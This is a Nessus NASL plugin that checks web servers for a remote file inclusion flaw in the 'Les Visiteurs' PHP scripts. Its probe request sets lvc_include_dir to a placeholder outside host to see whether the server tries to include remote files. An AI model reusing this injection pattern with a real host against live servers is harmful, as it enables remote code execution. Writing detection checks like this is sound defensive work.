#
# (C) Tenable Network Security
#
if(description)
{
 script_id(11911);
 script_bugtraq_id(8902);
 name["english"] = "'Les Visiteurs' script injection";
 script_name(english:name["english"]);

 desc["english"] = "
The remote 'Les Visiteurs' PHP scripts are vulnerable to a bug 
wherein any anonymous user can force the server to redirect to 
any arbitrary IP and download a potentially malicious include file.  

This can allow an attacker to upload and execute malicious
code on the web server

Solution: Upgrade to version 2.0.2 - http://chezwam.net/main/publications/lesvisiteurs/
Risk factor : High";

 script_description(english:desc["english"]);

 summary["english"] = "Les Visiteurs inc file upload";
 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);


 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_require_ports("Services/www", 80);
 exit(0);
}

# start the test

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;
if (!get_port_state(port)) exit(0);

foreach dir (make_list("", cgi_dirs()))
{
 req = http_get(item:dir + "/new-visitor.inc.php?lvc_include_dir=http://xxxxxxxxx/", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if ( egrep(pattern:"http://xxxxxxxxx/config\.inc\.php", string:res) ) 
 {
  security_hole(port);
  exit(0);
 }
}
